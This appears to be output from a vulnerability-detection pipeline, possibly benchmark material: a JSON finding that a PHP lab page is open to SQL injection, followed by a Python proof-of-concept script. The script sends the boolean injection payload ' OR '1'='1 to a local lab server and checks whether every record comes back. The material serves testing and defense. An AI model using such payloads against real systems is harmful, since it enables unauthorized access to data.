@@ -1,0 +1,103 @@
+```json
+{
+  "sample_id": "S001",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": [
+    "F01:0007",
+    "F01:0010",
+    "F01:0011",
+    "F01:0012"
+  ],
+  "evidence": {
+    "source": "F01:0007 从 $_GET['name'] 读取外部输入，默认空字符串。",
+    "flow": "F01:0007 的 $name 在 F01:0010 被直接拼接到单引号包围的 SQL 字符串中，随后 F01:0011 调用 $db->query($sql) 执行，F01:0012 取回结果。",
+    "guard": "无效：F01:0010 未使用 mysqli 预处理/绑定参数，F01:0007 后也未做转义或白名单；F01:0022-F01:0023 的 htmlspecialchars 只影响 HTML 输出，不能防止 SQL 注入。",
+    "sink": "F01:0011 将拼接后的 SQL 交给 $db->query 执行，属于可达的 SQL 执行点。"
+  },
+  "prerequisites": [
+    "PHP 服务运行在 http://127.0.0.1:4280/lab_cases/S001/index.php",
+    "common/db_connect.php 成功提供已连接的 mysqli 变量 $db",
+    "lab_people 表存在且预置数据为 1 Alice、2 Bob、3 Carol",
+    "无需登录"
+  ],
+  "missing_context": [
+    "common/db_connect.php 未包含在输入代码中，但运行上下文声明 $db 已连接；若实际连接失败或表数据不一致，本地验证无法判断。",
+    "未提供数据库错误模式或 SQL mode；若查询失败，页面会显示“查询失败，请检查输入后重试。”"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "将脚本保存为 s001_poc.py 后运行 python3 s001_poc.py。脚本固定目标为 http://127.0.0.1:4280/lab_cases/S001/index.php，使用 http.client 直连且不跟随重定向，不修改数据。普通对照请求 name=Alice，预期只解析到一条业务记录 ('1','Alice')；测试请求 name=' OR '1'='1，预期若 SQL 注入成立则解析到全部三条业务记录 ('1','Alice')、('2','Bob')、('3','Carol')。成功断言比较解析后的实际业务记录集合，而不是只检查姓名或字符串是否出现。若普通对照失败，需检查 127.0.0.1:4280 服务、common/db_connect.php、$db 连接和 lab_people 预置数据；本方案仅为模型分析发现后的验证方案，未实际执行。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+import http.client
+import re
+import html
+from urllib.parse import quote
+
+HOST = "127.0.0.1"
+PORT = 4280
+PATH = "/lab_cases/S001/index.php"
+
+
+def fetch(name: str):
+    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
+    try:
+        path = PATH + "?name=" + quote(name, safe="")
+        conn.request("GET", path, headers={"Host": f"{HOST}:{PORT}"})
+        resp = conn.getresponse()
+        body = resp.read().decode("utf-8", errors="replace")
+        status = resp.status
+    finally:
+        conn.close()
+    return status, body
+
+
+def parse_records(body: str):
+    # 匹配 <p>ID 1：Alice</p>，冒号为全角“：”
+    pattern = re.compile(r"<p>\s*ID\s+(\d+)\s*：\s*([^<]*)</p>", re.I)
+    return {(m.group(1), html.unescape(m.group(2).strip())) for m in pattern.finditer(body)}
+
+
+def main():
+    normal_name = "Alice"
+    test_name = "' OR '1'='1"
+
+    normal_status, normal_body = fetch(normal_name)
+    test_status, test_body = fetch(test_name)
+
+    if normal_status != 200 or test_status != 200:
+        raise SystemExit(f"HTTP 状态非 200：normal={normal_status}, test={test_status}")
+
+    normal_records = parse_records(normal_body)
+    test_records = parse_records(test_body)
+
+    print("normal records:", sorted(normal_records))
+    print("test records:", sorted(test_records))
+
+    expected_normal = {("1", "Alice")}
+    expected_test = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}
+
+    if normal_records != expected_normal:
+        raise SystemExit(
+            "普通业务对照失败：预期恰好 {('1','Alice')}。"
+            "请检查服务、数据库连接和 lab_people 预置数据；不能据此判定 SQL 注入。"
+        )
+
+    if test_records == expected_test:
+        print("VULNERABLE CONFIRMED：布尔注入返回了全部业务记录。")
+    elif test_records == expected_normal:
+        print("NOT CONFIRMED：测试请求与普通请求返回相同记录集合，请检查引号、数据库状态或错误输出。")
+    else:
+        raise SystemExit(
+            f"测试记录集合异常：{sorted(test_records)}。"
+            "请检查页面输出和数据库上下文后再判断。"
+        )
+
+
+if __name__ == "__main__":
+    main()
+```
